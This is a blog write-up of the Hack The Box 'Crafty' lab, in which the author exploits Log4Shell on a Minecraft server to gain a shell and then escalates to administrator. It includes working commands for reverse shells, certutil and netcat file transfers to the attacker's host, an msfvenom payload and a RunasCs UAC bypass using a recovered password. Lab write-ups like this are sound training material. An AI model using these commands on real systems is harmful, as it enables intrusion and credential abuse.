<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Crafty</title>
<meta name=description content="Platform: Hack The Box Link: Crafty Level: Easy OS: Windows Read this write up in french
Crafty is a Windows Server 2019 running Minecraft 1.16.5, this version …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-crafty/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Crafty"><meta property="og:description" content="Platform: Hack The Box Link: Crafty Level: Easy OS: Windows Read this write up in french
Crafty is a Windows Server 2019 running Minecraft 1.16.5, this version …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Crafty/Crafty.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Crafty/Crafty.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Crafty"><meta name=twitter:description content="Platform: Hack The Box Link: Crafty Level: Easy OS: Windows Read this write up in french
Crafty is a Windows Server 2019 running Minecraft 1.16.5, this version …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-crafty/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-crafty/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Crafty/Crafty.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-crafty/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-crafty/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Crafty</h1><small role=doc-subtitle></small><p class=post-date>5 min read |
<span class=post-date>June 12, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/Crafty>Crafty</a></li><li>Level: Easy</li><li>OS: Windows</li></ul><hr><p><a href=https://scorpiosec.com/fr/posts/htb-crafty/>Read this write up in french</a></p><p>Crafty is a Windows Server 2019 running Minecraft 1.16.5, this version is vulnerable to Log4Shell (<code>CVE-2021-44228</code>) and after using a PoC of the exploit we gain our initial foothold. On the target system, we find an archive containing some credential that we use to obtain an administrative shell.</p><p>Target IP - <code>10.10.11.249</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>sudo nmap -sC -sV -p- -oA nmap/Crafty 10.10.11.249
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-02-26 13:56 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> crafty.htb <span style=color:#56b6c2>(</span>10.10.11.249<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.054s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>65533</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE   VERSION
</span></span><span style=display:flex><span>80/tcp    open  http      Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>|_http-title: Crafty - Official Website
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>25565/tcp open  minecraft Minecraft 1.16.5 <span style=color:#56b6c2>(</span>Protocol: 127, Message: Crafty Server, Users: 0/100<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 171.62 seconds
</span></span></code></pre></div><p>We find two open ports:</p><ul><li>80 running HTTP</li><li>25565 running a Minecraft server with version 1.16.5</li></ul><p>Even though there is no redirection let&rsquo;s add <code>crafty.htb</code> to our hosts file.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.249 crafty.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>When we go to the website we find a web page about a game called Crafty.</p><p><img src=/images/HTB-Crafty/crafty-webpage.png alt="Crafty website"></p><p>There is nothing interesting on the web application so we turn our attention to the Minecraft server. When searching <code>minecraft 1.16.5 vulnerability</code> we find that there is a Log4j exploit for it with <a href=https://nvd.nist.gov/vuln/detail/CVE-2021-44228>CVE-2021-44228</a>.</p><blockquote><p><code>play.crafty.htb</code> redirects us to the main website.</p></blockquote><p><img src=/images/HTB-Crafty/log4j-Minecraft.png alt="Minecraft Log4j exploit"></p><p>We then find a PoC for the exploit at this <a href="https://github.com/kozmer/log4j-shell-poc?source=post_page-----316a735a306d--------------------------------">Github repo</a>.</p><p>After checking the content of <code>poc.py</code> we notice that it is using <code>String cmd="/bin/sh";</code> which will not work on Windows. In order to make it Windows compatible we change that line to <code>String cmd="cmd.exe";</code>.</p><p><img src=/images/HTB-Crafty/log4j-poc-content.png alt="Log4j PoC content"></p><p><img src=/images/HTB-Crafty/poc-python-change.png alt="Log4j PoC content change"></p><p>On the exploit page, we read: &ldquo;<strong>Note:</strong> For this to work, the extracted java archive has to be named: <code>jdk1.8.0_20</code>, and be in the same directory.&rdquo;</p><p>Going to the website provided on the Github page we are required to create an account. After searching around we find some java archives on <a href=https://repo.huaweicloud.com/java/>https://repo.huaweicloud.com/java/</a>.</p><p>For a quick download and setup use the commands below.</p><pre tabindex=0><code>#Make sure to download it in the log4j-shell-poc directory
wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz

tar -xf jdk-8u181-linux-x64.tar.gz

#Rename the file
mv jdk1.8.0_181 jdk1.8.0_20
</code></pre><h2 id=initial-foothold>Initial Foothold</h2><p>Here are all our files.</p><p><img src=/images/HTB-Crafty/log4j-poc-files.png alt="Log4j PoC files"></p><p>We need a way to communicate with the Minecraft server, we will use <a href=https://github.com/ammaraskar/pyCraft>pyCraft</a> for that. Let&rsquo;s setup a virtual environment for pyCraft.</p><pre tabindex=0><code>virtualenv ENV

source ENV/bin/activate

pip install -r requirements.txt
</code></pre><p><img src=/images/HTB-Crafty/pyCraft-setup.png alt="PyCraft setup"></p><p>Now we setup a listener to catch the shell.</p><pre tabindex=0><code>rlwrap nc -lvnp 4444
</code></pre><p>Then we start the log4j exploit from the <code>log4j-shell-poc</code> directory.</p><pre tabindex=0><code>python3 poc.py --userip &lt;IP_ADDRESS&gt; --webport 80 --lport &lt;PORT_NUMBER&gt;
</code></pre><p><img src=/images/HTB-Crafty/crafty-exploit.png alt="Log4j exploit launch"></p><p>From the <code>PyCraft</code> folder we run <code>start.py</code></p><pre tabindex=0><code>python3 start.py
</code></pre><p>After the <code>Connected.</code> message appears in PyCraft. We copy the link provided on the line starting with <code>Send me:</code> in <code>log4j-shell-poc</code>, paste it in pyCraft then press <code>Enter</code> and we catch a shell on the listener.</p><p><img src=/images/HTB-Crafty/PyCraft-connection-link.png alt=PyCraft></p><blockquote><p>If PyCraft fails to connect to the server, resetting the box should solve the issue.</p></blockquote><p><img src=/images/HTB-Crafty/shell-minecraft.png alt="svc_minecraft shell"></p><p>The user flag is on the user desktop.</p><p><img src=/images/HTB-Crafty/crafty-user-flag.png alt="Crafty user flag"></p><h2 id=privilege-escaltion>Privilege Escaltion</h2><p>In <code>c:\Users\svc_minecraft\server\plugins\</code> we find an archive named <code>playercounter-1.0-SNAPSHOT.jar</code>.</p><p>To send that file to our local machine we use <code>nc.exe</code> (Netcat for Windows)</p><ol><li>Download <code>nc.exe</code> with</li></ol><pre tabindex=0><code>wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
</code></pre><ol start=2><li><p>Move into the <code>netcat-1.11</code> directory created after the extraction</p></li><li><p>Start a web server with Python</p></li></ol><pre tabindex=0><code>python3 -m http.server
</code></pre><ol start=4><li>We download <code>nc.exe</code> on the target</li></ol><pre tabindex=0><code>certutil.exe -urlcache -split -f http://IP:PORT/nc.exe nc.exe
</code></pre><p><img src=/images/HTB-Crafty/nc.exe-ontarget.png alt="netcat upload on target"></p><ol start=5><li>On our local machine we run</li></ol><pre tabindex=0><code>nc -nlp 1235 &gt; playercounter-1.0-SNAPSHOT.jar
</code></pre><ol start=6><li>Finally, we send the archive to our Kali machine</li></ol><pre tabindex=0><code>.\nc.exe 10.10.14.222 1235 &lt; c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
</code></pre><p><img src=/images/HTB-Crafty/archive-exfiltration.png alt="Crafty archive exfiltration"></p><blockquote><p>Stop the listener to regain control of the terminal on the target system.</p></blockquote><p>After extracting the archive, we get <code>Playercounter.class</code> in <code>/htb/crafty/playercounter/</code>which we decompile with <a href=https://www.decompiler.com/>decompiler.com</a>.</p><blockquote><p>A <code>.class</code> file is a compiled Java bytecode file. When you compile a Java source code file (<code>.java</code>), the Java compiler (<code>javac</code>) translates the human-readable Java code into a platform-independent bytecode format. This bytecode is then stored in <code>.class</code> files. In our case <code>Playercounter.class</code> contains the compiled bytecode for the <code>Playercounter</code> Java class.</p></blockquote><p>We find what looks like some credential (<code>s67u84zKq8IXw</code>) used when connecting to a service on port 27015 (typically used by online games).</p><p><img src=/images/HTB-Crafty/playercount-file.png alt="archive content credentials"></p><p>We have a tool called <a href=https://github.com/antonioCoco/RunasCs>RunasCs</a> that enables us to execute processes with permissions different from our current user&rsquo;s. Our objective is to get an Administrator shell from the current user <code>svc_minecraft</code>.</p><p>Let&rsquo;s generate a payload with <code>msfvenom</code>.</p><p><strong>Example</strong></p><pre tabindex=0><code>msfvenom -p windows/x64/shell_reverse_tcp lhost=&lt;YOUR IP ADDRESS&gt; lport=&lt;PORT NUMBER&gt; -f exe -a x64 --platform windows -o shell.exe
</code></pre><p><code>shell.exe</code> and <code>RunasCs.exe</code> are transferred to the target using the same method employed for <code>nc.exe</code>.</p><p><img src=/images/HTB-Crafty/files-on-target.png alt="malicious file and runascs.exe on target"></p><p>We setup another listener on the port selected for the <code>msfvenom</code> payload.</p><pre tabindex=0><code>rlwrap -cAr nc -lvp &lt;PORT_NUMBER&gt;
</code></pre><p>We then use <code>runasCs</code> in conjunction with the malicious file.</p><pre tabindex=0><code>.\runasCs.exe administrator s67u84zKq8IXw shell.exe --bypass-uac
</code></pre><p>We get a connection on the listener, as <code>administrator</code>.</p><p><img src=/images/HTB-Crafty/admin-shell.png alt="admin shell"></p><p>At <code>C:\Users\Administrator\Desktop</code> we find <code>root.txt</code>.</p><p><img src=/images/HTB-Crafty/root-flag.png alt="root flag"></p><h2 id=closing-words>Closing Words</h2><p>Log4j is considered one of the most severe vulnerability because it allows attackers to easily take over vulnerable systems. It is very important to be able to recognize and test for those popular vulnerabilities. If you want to learn more about it, below are a video and an article detailing it:</p><ul><li><a href="https://www.youtube.com/watch?v=UhuL11JaECM&amp;ab_channel=IntotheShadows">Apache Log4j: The Exploit that Almost Killed the Internet</a></li><li><a href=https://builtin.com/articles/log4j-vulerability-explained>Log4J Vulnerability Explained: What It Is and How to Fix It</a></li></ul></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-bizness/>&#8592;
Previous:
HTB: Bizness</a></p><p class=prev-post-date>May 22, 2024</p></div><div class=next-post><p><a href=/posts/htb-headless/>Next:
HTB: Headless
&#8594;</a></p><p class=next-post-date>July 19, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a></li><li><a href=#privilege-escaltion>Privilege Escaltion</a></li><li><a href=#closing-words>Closing Words</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>